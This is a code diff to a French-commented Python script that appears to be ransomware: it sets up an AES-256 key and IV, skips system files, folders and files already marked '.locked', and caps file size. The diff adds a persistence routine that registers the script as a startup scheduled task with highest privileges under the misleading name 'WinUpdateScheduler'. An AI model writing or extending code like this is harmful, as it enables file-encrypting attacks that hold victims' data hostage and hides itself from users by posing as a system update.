@@ -4,13 +4,14 @@ from pathlib import Path
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+import subprocess
 
 # Clé et IV pour AES-256 CBC
 key = os.urandom(32)  # 256 bits
 iv = os.urandom(16)   # 128 bits
 
 # Extensions de fichiers à exclure
-extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com")
+extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com",".locked")
 
 # Dossiers à exclure (en minuscules)
 folders_exclus = [
@@ -28,9 +29,25 @@ folders_exclus = [
     "local",
     "microsoft",
     "programdata",
+    ".vscode"
 ]
 
 max_size = 100 * 1024 * 1024
+
+
+
+def ajouter_tache_planifiee():
+    try:
+        script_path = os.path.realpath(sys.argv[0])
+        task_name = "WinUpdateScheduler"
+
+        cmd = f"""
+        schtasks /create /tn "{task_name}" /tr "{script_path}" /sc ONSTART /RL HIGHEST /f
+        """
+        subprocess.run(["powershell", "-Command", cmd], shell=True)
+        print("[+] Tâche planifiée ajoutée.")
+    except Exception as e:
+        print(f"[!] Erreur tâche planifiée: {e}")
 
 
 def is_in_excluded_folder(file_path: Path):
